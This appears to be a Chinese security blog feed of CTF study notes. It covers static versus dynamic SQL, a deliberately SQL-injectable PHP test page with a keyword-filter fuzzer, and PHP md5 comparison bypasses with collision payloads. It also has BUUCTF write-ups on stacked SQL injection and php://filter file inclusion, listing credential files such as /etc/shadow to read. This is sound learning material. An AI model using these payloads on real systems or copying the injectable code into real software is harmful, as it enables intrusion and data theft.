静态sql ：静态SQL语句一般用于嵌入式sql应用中，在程序运行前，sql 语句必须是确定的例如sql语句中涉及的列名和表名必须是存在的，静态sql语句的编译是在应用程序执行前进行的，编译的结果会存储在数据库内部，而后程序运行的时候，数据库将直接执行比那一号的SQL语句，从而降低与形式的开销</p>
<p>静态SQL在编译的时候就已经生成好了执行计划，所以执行效率会更高</p>
<p>动态sql ：动态SQL语句是在应用程序执行时被编译和执行的，例如使用DB2的交互式工具CLP访问数据库时，用户输入的SQL语句时不确定的，因此SQL语句只能被动态的编译，动态SQL的应用比较多，常见的CLI和JDBC应用程序都使用动态SQL</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SQL注入过滤字符的Fuzz脚本测试]]></title>
        <id>https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/</id>
        <link href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">
        </link>
        <updated>2021-06-22T04:34:15.000Z</updated>
        <content type="html"><![CDATA[<p>Get.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Sql Waf Test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
	&lt;h1&gt;Insert Data&lt;/h1&gt;
	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
$black_list=&quot;/select|sleep|and|or|union|\&quot;|'|--|#|where|from|limit/i&quot;;
$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
mysqli_query($con,&quot;create database test&quot;);
mysqli_select_db($con,&quot;test&quot;);
mysqli_query($con,&quot;create table tb_user
	(
	uid int(11) primary key auto_increment not null,
	username varchar(50) not null,
	password varchar(50) not null,
	UNIQUE(username)
	)&quot;);
if(isset($_GET['submit1'])){
	$username = $_GET['username'];
	$password = md5($_GET['password']);
	if(preg_match($black_list,$username)){
		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
	}else{
		if(empty($username) || empty($password)){
			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
		}else{
			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
			if($insert_sql){
				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
			}else{
				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
			}
		}
	}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;h1&gt;Query Data&lt;/h1&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
if(isset($_GET['submit2'])){
$query_name = $_GET['query'];
if(preg_match($black_list,$query_name)){
die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
}else{
if(empty($query_name)){
echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
}else{
$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
if($query_data){
$sql_data = mysqli_fetch_assoc($query_data);
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump($sql_data);
}else{
echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
}
}
}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>sql_waf_test.py</p>
<pre><code>import requests

sql_char = ['select',
		'union',
		'and',
		'or',
		'sleep',
		'where',
		'from',
		'limit',
		'group',
		'by',
		'like',
		'prepare',
		'as',
		'if',
		'char',
		'ascii',
		'mid',
		'left',
		'right',
		'substring',
		'handler',
		'updatexml',
		'extractvalue',
		'benchmark',
		'insert',
		'update',
		'all',
		'@',
		'#',
		'^',
		'&amp;',
		'*',
		'\'',
		'&quot;',
		'~',
		'`',
		'(',
		')',
		'--',
		'=',
		'/',
		'\\',
		' ']

for char in sql_char:
res = requests.get(&quot;http://127.0.0.1/get.php?query=&quot;+char+&quot;&amp;submit2=sbumit&quot;)
if 'Illegal Char' in res.text:
	print(&quot;该字符是非法字符: {0}&quot;.format(char))
else:
	print(&quot;通过: {0}&quot;.format(char))
</code></pre>
<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
该字符是非法字符: select<br>
该字符是非法字符: union<br>
该字符是非法字符: and<br>
该字符是非法字符: or<br>
该字符是非法字符: sleep<br>
该字符是非法字符: where<br>
该字符是非法字符: from<br>
该字符是非法字符: limit<br>
通过: group<br>
通过: by<br>
通过: like<br>
通过: prepare<br>
通过: as<br>
通过: if<br>
通过: char<br>
通过: ascii<br>
通过: mid<br>
通过: left<br>
通过: right<br>
通过: substring<br>
该字符是非法字符: handler<br>
通过: updatexml<br>
通过: extractvalue<br>
通过: benchmark<br>
通过: insert<br>
通过: update<br>
通过: all<br>
通过: @<br>
通过: #<br>
通过: ^<br>
通过: &amp;<br>
通过: *<br>
该字符是非法字符: '<br>
该字符是非法字符: &quot;<br>
通过: ~<br>
通过: `<br>
通过: (<br>
通过: )<br>
该字符是非法字符: --<br>
通过: =<br>
通过: /<br>
通过: <br>
通过:</p>
<p>Post.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Sql Waf Test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
	&lt;h1&gt;Insert Data&lt;/h1&gt;
	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
$black_list=&quot;/select|and|or|union|limit/i&quot;;
$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
mysqli_query($con,&quot;create database test&quot;);
mysqli_select_db($con,&quot;test&quot;);
mysqli_query($con,&quot;create table tb_user
	(
	uid int(11) primary key auto_increment not null,
	username varchar(50) not null,
	password varchar(50) not null,
	UNIQUE(username)
	)&quot;);
if(isset($_POST['submit1'])){
	$username = $_POST['username'];
	$password = md5($_POST['password']);
	if(preg_match($black_list,$username)){
		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
	}else{
		if(empty($username) || empty($password)){
			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
		}else{
			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
			if($insert_sql){
				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
			}else{
				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
			}
		}
	}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;h1&gt;Query Data&lt;/h1&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
if(isset($_POST['submit2'])){
$query_name = $_POST['query'];
if(preg_match($black_list,$query_name)){
die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
}else{
if(empty($query_name)){
echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
}else{
$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
if($query_data){
$sql_data = mysqli_fetch_assoc($query_data);
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump($sql_data);
}else{
echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
}
}
}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>sql_waf_test.py</p>
<pre><code>import requests

sql_char = ['select',
		'union',
		'and',
		'or',
		'sleep',
		'where',
		'from',
		'limit',
		'group',
		'by',
		'like',
		'prepare',
		'as',
		'if',
		'char',
		'ascii',
		'mid',
		'left',
		'right',
		'substring',
		'handler',
		'updatexml',
		'extractvalue',
		'benchmark',
		'insert',
		'update',
		'all',
		'@',
		'#',
		'^',
		'&amp;',
		'*',
		'\'',
		'&quot;',
		'~',
		'`',
		'(',
		')',
		'--',
		'=',
		'/',
		'\\',
		' ']
url = &quot;http://127.0.0.1/get.php&quot;
header = {
'Host':'127.0.0.1',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded'
}
for char in sql_char:
post_data = &quot;query=test&quot;+char+&quot;&amp;submit2=sbumit&quot;
res = requests.post(url,data=post_data,headers=header)
if 'Illegal Char' in res.text:
	print(&quot;该字符是非法字符: {0}&quot;.format(char))
else:
	print(&quot;通过: {0}&quot;.format(char))
</code></pre>
<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
该字符是非法字符: select<br>
该字符是非法字符: union<br>
该字符是非法字符: and<br>
该字符是非法字符: or<br>
通过: sleep<br>
通过: where<br>
通过: from<br>
该字符是非法字符: limit<br>
通过: group<br>
通过: by<br>
通过: like<br>
通过: prepare<br>
通过: as<br>
通过: if<br>
通过: char<br>
通过: ascii<br>
通过: mid<br>
通过: left<br>
通过: right<br>
通过: substring<br>
该字符是非法字符: handler<br>
通过: updatexml<br>
通过: extractvalue<br>
通过: benchmark<br>
通过: insert<br>
通过: update<br>
通过: all<br>
通过: @<br>
通过: #<br>
通过: ^<br>
通过: &amp;<br>
通过: *<br>
通过: '<br>
通过: &quot;<br>
通过: ~<br>
通过: `<br>
通过: (<br>
通过: )<br>
通过: --<br>
通过: =<br>
通过: /<br>
通过: <br>
通过:<br>
————————————————<br>
版权声明：本文为CSDN博主「末 初」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/mochu7777777/article/details/108073359</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[md5相关比较]]></title>
        <id>https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/</id>
        <link href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">
        </link>
        <updated>2021-06-19T07:27:36.000Z</updated>
        <content type="html"><![CDATA[<p>弱比较</p>
<pre><code>if($_POST['a']!=$_POST['b']&amp;&amp; md5($_POST['a'])==md5($_POST['b'])){
die(&quot;success!&quot;);
}
</code></pre>
<p>在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时0=0为true绕过<br>
payload：</p>
<pre><code>a=QNKCDZO&amp;b=s878926199a
</code></pre>
<p>常用md5加密后为0的字符串：<br>
240610708，aabg7XSs，aabC9RqS<br>
s878926199a</p>
<p>强比较</p>
<pre><code>if($_POST['a']!==$_POST['b']&amp;&amp; md5($_POST['a'])===md5($_POST['b'])){
die(&quot;success!&quot;);
}
</code></pre>
<p>像这样的强比较，上面的方法就失效了，但是如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为true绕过<br>
payload：</p>
<pre><code>a[]=1&amp;b[]=2
</code></pre>
<p>强碰撞<br>
if((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">_POST[&#x27;a&#x27;]!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>_POST['b'] &amp;&amp; md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">_POST[&#x27;a&#x27;])===md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>_POST['b'])){<br>
die(&quot;success!&quot;);<br>
}</p>
<p>到强碰撞这里，它用string强行转换成字符串，从而限制了数组绕过这方法，只能输入字符串<br>
先上payload：</p>
<pre><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
</code></pre>
<p>这一大长串的编码，他们的md5值是相等的，原理是将hex字符串转化为ascii字符串，并写入到bin文件<br>
考虑到要将一些不可见字符传到服务器，这里使用url编码</p>
<p>以下脚本均为开头那篇师傅的文章摘抄下<br>
这个是将hex写入到bin文件的python脚本源码：</p>
<p>#!coding:utf-8</p>
<pre><code>hexString1 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'
hexString2 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'

hexList1 = []
intList1 = []
asciiString1 =''

while True:
intString1 = hexString1[0:2]
hexString1 = hexString1[2:]
hexList1.append(intString1)
if (hexString1 == ''):
break

for i in hexList1:
intList1.append(int(i,16))
for j in intList1:
asciiString1 += chr(int(j))

f = open('1.bin','w')
f.write(asciiString1)
f.close()

hexList2 = []
intList2 = []
asciiString2 =''

while True:
intString2 = hexString2[0:2]
hexString2 = hexString2[2:]
hexList2.append(intString2)
if (hexString2 == ''):
break

for i in hexList2:
intList2.append(int(i,16))
for j in intList2:
asciiString2 += chr(int(j))

f = open('2.bin','w')
f.write(asciiString2)
f.close()
</code></pre>
<p>这个是将bin文件内容再次url编码的python脚本源码：</p>
<p>#!coding:utf-8<br>
import urllib</p>
<pre><code>urlString1=''
urlString2 = ''

for line in open('1.bin'):
urlString1 +=  urllib.quote(line)

for line in open('2.bin'):
urlString2 +=  urllib.quote(line)

print urlString1
print urlString2
</code></pre>
<p>这题也可以直接用python调用open并读取文件来传参：</p>
<pre><code>import requests
p1 = open('1.bin')
p2 = open('2.bin')
data = {'param1':p1,'param2':p2}
r = S.post(url,data = data)
print r.text
</code></pre>
<p>我看了师傅的文章后还是很迷，因为不管怎么样，他们的字符串一直都是相同的，甚至连payload的参数都是一样的，但就是能绕过比较，如果有懂这方面的师傅，请务必要教教我(｡･ω･｡)<br>
————————————————<br>
版权声明：本文为CSDN博主「小 白 萝 卜」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/EC_Carrot/article/details/109525162</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTF]]></title>
        <id>https://jinqipiaopiao.github.io/post/buuctf/</id>
        <link href="https://jinqipiaopiao.github.io/post/buuctf/">
        </link>
        <updated>2021-06-06T06:34:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="suctf-2019easysql1">[SUCTF 2019]EasySQL1</h1>
<p>输入1，有回显<br>
输入2，有回显，输入非零数字都有回显，输入字母无回显<br>
这道题目需要我们去对后端语句进行猜测</p>
<p>1、输入非零数字得到的回显1和输入其余字符得不到回显=&gt;来判断出内部的查询语句可能存在有||</p>
<p>2、也就是select 输入的数据||内置的一个列名 from 表名=&gt;即为</p>
<pre><code>select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
</code></pre>
<p>此时的||起到的作用是or的作用</p>
<p>解法1<br>
内置的sql语句为</p>
<pre><code>sql=“select”.post[‘query’].&quot;||flag from Flag&quot;;
</code></pre>
<p>如果<code>$post[‘query’]</code>的数据为*,1，sql语句就变成了</p>
<pre><code>select *,1||flag from Flag
</code></pre>
<p>也就是</p>
<pre><code>select *,1 from Flag
</code></pre>
<p>也就是直接查询出了Flag表中的所有内容<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622963455648.png" alt="" loading="lazy"><br>
解法2<br>
输入的内容为</p>
<pre><code>1;set sql_mode=pipes_as_concat;select 1
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622963484692.png" alt="" loading="lazy"><br>
我们执行的语句分别为</p>
<pre><code>select 1
set sql_mode=pipes_as_concat
select 1||flag from Flag
</code></pre>
<p>读出flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622963518649.png" alt="" loading="lazy"></p>
<p>————————————————<br>
版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_44866139/article/details/105857487</p>
<h1 id="actf2020-新生赛include1">[ACTF2020 新生赛]Include1</h1>
<p>include(文件包含漏洞，php伪协议)</p>
<p>查看元素，也并没有有用的信息，联想到题目,include<br>
想起了文件包含漏洞。<br>
构造payload<br>
?file=/../../../../../../flag.php</p>
<p>没有返回东西。看完wq学到了一个新姿势：<br>
php伪代码</p>
<pre><code>https://segmentfault.com/a/1190000018991087
https://www.freebuf.com/column/148886.html
</code></pre>
<p>构造payload<br>
?file=php://filter/read=convert.base64-encode/resource=flag.php<br>
使用 &quot;php://filter&quot;伪协议&quot; 来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
<p>构造Payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>这里需要注意的是使用php://filter伪协议进行文件包含时，需要加上read=convert.base64-encode来对文件内容进行编码</p>
<p>发送请求得到base64编码后的flag.php文件源码:<br>
得到base64加密后的flag.php文件，丢去解密得到flag。</p>
<p>文件包含漏洞</p>
<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>
`PHP中文件包含函数有以下四种：</p>
<pre><code>require()

require_once()

include()

include_once()

`
</code></pre>
<p>示例代码</p>
<p>如果服务器配置不当，可以目录跨越等等，传个../../../../../etc/passwd等等，可以查阅很多意外的文件。<br>
`windows常见文件：</p>
<pre><code>c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息
</code></pre>
<p>linux常见文件：</p>
<pre><code>/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
</code></pre>
<p>文件包含分本地文件包含和远程文件包含，本地文件包含就是利用服务器的配置不当访问服务器本地的文件，而远程文件包含是在</p>
<p>allow_url_fopen = On（是否允许打开远程文件）</p>
<p>allow_url_include = On（是否允许include/require远程文件）</p>
<p>`<br>
以上两个字段为On时，此时允许服务器包含远程的服务器的文件，这时可以在远程服务器配置一个马.txt之类的，里面写上php代码，让靶机去包含它。</p>
<p>【file://协议】</p>
<p>PHP.ini：</p>
<p>file:// 协议在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen ：off/on</p>
<p>allow_url_include：off/on</p>
<p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p>使用方法：</p>
<pre><code>file:// [文件的绝对路径和文件名]

http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt
</code></pre>
<p>【php://协议】</p>
<p>条件：</p>
<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
<p>参考自：http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq</p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<pre><code>PHP.ini：

php://filter在双off的情况下也可以正常使用；

allow_url_fopen ：off/on

allow_url_include：off/on
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622964969941.png" alt="" loading="lazy"></figure>
<p>测试现象：<br>
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622964973937.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622964977636.png" alt="" loading="lazy"></p>
<p>测试现象：</p>
<pre><code>http://127.0.0.1/cmd.php?file=php://input

[POST DATA] &lt;?php phpinfo()?&gt;
</code></pre>
<p>参考自：<br>
https://www.cnblogs.com/cmredkulaa/p/14008645.html</p>
<h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
<p>BUFFctf蒋璐媛的秘密<br>
打开在线场景，发现三个大字蒋璐媛<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966646571.png" alt="" loading="lazy"><br>
那么就继续看了，首先就应该看看他的源码了：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966650090.png" alt="" loading="lazy"><br>
打开他的这个下面的php文件瞅瞅：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966653167.png" alt="" loading="lazy"><br>
是个按钮我们就要一一分析了：</p>
<p>按了一下按钮发现：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966655922.png" alt="" loading="lazy"><br>
那就要来看看源码了：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966658952.png" alt="" loading="lazy"><br>
从这里看它是有个action.php,说明它跳的太快用burpsuite抓一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966662432.png" alt="" loading="lazy"><br>
看来问题就出在这个ser3t文件上。</p>
<p>那我们就输入一下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966670380.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966674246.png" alt="" loading="lazy"><br>
因为刚刚刚好有一个题就是用的base64的隐写所以就用这个方法了哈哈哈</p>
<pre><code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622966678771.png" alt="" loading="lazy"><br>
然后用base64解码即<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966696532.png" alt="" loading="lazy"></p>
<p>参考自：https://blog.csdn.net/vsdvscs/article/details/116563866</p>
<h1 id="极客大挑战-2019lovesql1">[极客大挑战 2019]LoveSQL1</h1>
